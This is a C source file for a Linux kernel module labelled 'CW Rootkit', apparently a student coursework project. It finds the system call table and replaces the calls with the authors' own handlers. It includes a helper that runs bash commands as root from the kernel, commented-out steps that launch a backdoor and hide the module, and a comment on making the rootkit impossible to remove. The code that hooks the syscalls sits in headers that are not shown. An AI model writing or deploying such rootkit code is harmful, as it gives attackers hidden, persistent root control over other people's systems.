#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>

#include "rootkit_main.h"
#include "modify_syscalls.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Finn_Adam_Charlie");
MODULE_DESCRIPTION("CW Rootkit");
MODULE_VERSION("0.0.1");

void **sys_call_table;
struct sysinfo *info;

static int __init lkm_example_init(void) {
    //finding syscall table
    sys_call_table = find_syscall_table();
    //re-place syscalls with our own
    update_sys_calls(sys_call_table);

    //launch backdoor
    //run_bash("~/virus/backdoor")
    //hide();

    return 0;
}

static void __exit lkm_example_exit(void) {
    //re-load original syscalls
    revert_to_original(sys_call_table);
}

// runs a bash command
int run_bash(char* command) {
    int res;
    char* argv[4];
    char* envp[4];

    argv[0] = "bin/bash";
    argv[1] = "-c";
    argv[2] = command;
    argv[3] = NULL;

    envp[0] = "HOME=/";
    envp[1] = "TERM=linux";
    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
    envp[3] = NULL;

    res = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return res;
}



module_init(lkm_example_init);
//Comment this line out to make it so the rootkit can't be removed
module_exit(lkm_example_exit);
